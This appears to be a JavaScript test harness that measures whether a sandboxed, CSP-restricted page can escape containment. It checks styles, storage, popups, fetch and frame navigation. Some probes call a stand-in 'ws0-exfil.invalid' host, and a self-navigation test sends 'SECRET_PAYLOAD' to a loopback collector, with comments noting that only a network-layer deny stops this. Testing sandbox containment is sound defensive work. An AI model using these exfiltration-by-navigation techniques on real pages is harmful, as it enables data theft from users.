/**
 * WS0 assertion harness. Runs inside the UNTRUSTED, sandboxed page.
 *
 * Ordering matters: the "safe" assertions run and report first, because the
 * destructive ones (form submit, self-navigation) can navigate the frame away
 * and destroy the results if they succeed — and whether they succeed is
 * precisely what we are measuring.
 */
;(function () {
  if (window.__ws0beacon) window.__ws0beacon('app-js-executed')

  var isTopLevel = false
  try { isTopLevel = (window.top === window) } catch (e) { isTopLevel = false }

  const results = []

  function record(id, question, expected, actualFn) {
    let actual, error = null
    try {
      actual = actualFn()
    } catch (e) {
      error = String((e && e.name) || e)
      actual = 'THREW: ' + error
    }
    results.push({ id, question, expected, actual: String(actual) })
  }

  function computed(sel, prop) {
    const el = document.querySelector(sel)
    return el ? getComputedStyle(el)[prop] : '<missing>'
  }

  function violationsFor(needle) {
    return (window.__WS0_VIOLATIONS__ || [])
      .filter((v) => String(v.blockedURI).includes(needle))
      .map((v) => v.directive)
      .join(',') || 'none'
  }

  function runSafe() {
    // ── Does the page still work? ─────────────────────────────────────────
    record('classic-script', 'classic <script src> executes under script-src self',
      'yes', () => 'yes') // this file running at all is the proof
    record('module-script', 'type="module" script executes under script-src self',
      'yes', () => (window.__WS0_MODULE__ ? 'yes' : 'NO'))
    record('data-as-js', 'page data delivered as executed JS is available',
      'yes', () => (window.__WS0_DATA__ ? 'yes' : 'NO'))
    record('external-css', 'external stylesheet applies under style-src self',
      'rgb(0, 128, 0)', () => computed('#externalStyleProbe', 'color'))
    record('css-url-asset', 'CSS url() asset not CSP-blocked',
      'none', () => violationsFor('dot.png'))
    record('woff2-font', 'WOFF2 font request not CSP-blocked (parse not tested)',
      'none', () => violationsFor('probe.woff2'))
    record('relative-img', 'relative <img src> resolves in an opaque-origin doc',
      'loaded', () => {
        const img = document.getElementById('relImg')
        return img && img.complete && img.naturalWidth > 0 ? 'loaded' : 'NOT-loaded'
      })
    record('relative-link', 'relative href resolves against the document URL',
      'ends /r/1/page2.html', () => {
        const a = document.getElementById('relLink')
        return a ? (a.href.endsWith('/r/1/page2.html') ? 'ends /r/1/page2.html' : a.href) : '<missing>'
      })

    // ── Open decision: what does style-src 'self' actually cost? ──────────
    record('inline-style-element', '<style> block applies without unsafe-inline',
      'MEASURE', () => computed('#inlineStyleProbe', 'color'))
    record('style-attribute', 'style="" attribute applies without unsafe-inline',
      'MEASURE', () => computed('#styleAttrProbe', 'color'))
    record('cssom-write', 'el.style.prop = ... (CSSOM) applies',
      'MEASURE', () => {
        const el = document.getElementById('cssomProbe')
        el.style.color = 'rgb(7, 8, 9)'
        return computed('#cssomProbe', 'color')
      })
    record('setattribute-style', "el.setAttribute('style', ...) applies",
      'MEASURE', () => {
        const el = document.getElementById('setAttrProbe')
        el.setAttribute('style', 'color: rgb(10, 11, 12)')
        return computed('#setAttrProbe', 'color')
      })

    // ── Is it contained? ─────────────────────────────────────────────────
    record('origin', 'document origin is opaque',
      'null', () => window.origin)
    record('localstorage', 'localStorage is unavailable in an opaque origin',
      'THREW', () => { localStorage.getItem('x'); return 'ACCESSIBLE' })
    record('cookies', 'document.cookie in an opaque origin',
      'MEASURE', () => { const c = document.cookie; return c === '' ? 'empty-string' : c })
    record('window-open', 'window.open blocked without allow-popups',
      'blocked', () => { const w = window.open('https://ws0-exfil.invalid/'); return w ? 'OPENED' : 'blocked' })
    // Only meaningful when FRAMED. When this document is itself the top-level
    // browsing context, window.top === window, so this test would navigate the
    // page away mid-run and destroy every later measurement — including the
    // self-navigation test, which is the one that actually matters.
    if (!isTopLevel) {
      record('top-nav', 'top-frame navigation blocked without allow-top-navigation',
        'THREW', () => { window.top.location.href = 'https://ws0-exfil.invalid/top'; return 'NAVIGATED' })
    } else {
      results.push({ id: 'top-nav', question: 'top-frame navigation (framed only)',
        expected: 'n/a', actual: 'skipped: document IS top-level' })
    }

    // Async: fetch. Resolve both before reporting.
    const fetches = Promise.all([
      fetch('data.json').then(() => 'ALLOWED').catch((e) => 'blocked:' + e.name),
      fetch('https://ws0-exfil.invalid/x').then(() => 'ALLOWED').catch((e) => 'blocked:' + e.name),
    ])

    return fetches.then(([sameOrigin, external]) => {
      results.push({
        id: 'fetch-same-origin',
        question: "fetch() of the page's own JSON under connect-src 'none'",
        expected: 'blocked', actual: sameOrigin,
      })
      results.push({
        id: 'fetch-external',
        question: 'fetch() to an external host',
        expected: 'blocked', actual: external,
      })
      results.push({
        id: 'csp-violations',
        question: 'all CSP violations observed during load',
        expected: 'MEASURE',
        actual: JSON.stringify(window.__WS0_VIOLATIONS__ || []),
      })
      return results
    })
  }

  function report(payload) {
    document.getElementById('out').textContent = JSON.stringify(payload, null, 2)
    // parent is the trusted wrapper when framed; when opened directly, parent
    // === window and this is a harmless no-op.
    try { parent.postMessage({ ws0: true, kind: 'results', payload }, '*') } catch (_) {}
  }

  window.addEventListener('load', function () {
    if (window.__ws0beacon) window.__ws0beacon('load-fired-isTopLevel=' + isTopLevel)
    runSafe().then(function (r) {
      report(r)
      if (window.__ws0beacon) window.__ws0beacon('results-reported')
      if (isTopLevel) {
        // No wrapper to command us. Self-trigger the decisive test — the exfil
        // catcher on :9999 is the observation channel, so this works in any
        // browser with no instrumentation.
        // Beacon and navigation are separated in time on purpose: setting
        // location.href cancels in-flight subresource requests, so firing the
        // beacon immediately before would make "callback never ran" and
        // "navigation happened" indistinguishable.
        setTimeout(function () {
          if (window.__ws0beacon) window.__ws0beacon('about-to-self-nav')
          setTimeout(function () {
            location.href = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD&ctx=top-level'
          }, 500)
        }, 600)
      }
    })
  })

  // Destructive phase — only on explicit command from the wrapper.
  window.addEventListener('message', function (e) {
    const d = e.data
    if (!d || d.ws0cmd !== true) return

    if (d.cmd === 'form-submit') {
      let outcome = 'no-navigation'
      try { document.getElementById('exfilForm').submit() } catch (err) { outcome = 'THREW:' + err.name }
      setTimeout(() => {
        parent.postMessage({
          ws0: true, kind: 'form-result',
          payload: { outcome, violations: window.__WS0_VIOLATIONS__ },
        }, '*')
      }, 300)
    }

    if (d.cmd === 'self-nav') {
      // THE decisive test. No sandbox flag restricts a document navigating its
      // OWN frame, and CSP's navigate-to was removed from the spec, so nothing
      // in-page should stop this. Only a network-layer deny can.
      //
      // Target is a real, resolvable loopback URL on a DIFFERENT port (=>
      // different origin). A reserved .invalid TLD risks being short-circuited
      // before it reaches the network layer, which would mask the result.
      var target = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD&ctx=framed'
      parent.postMessage({ ws0: true, kind: 'self-nav-ack', payload: { target: target } }, '*')
      try {
        location.href = target
      } catch (err) {
        parent.postMessage({ ws0: true, kind: 'self-nav-threw', payload: String(err && err.name) }, '*')
      }
    }
  })
})()
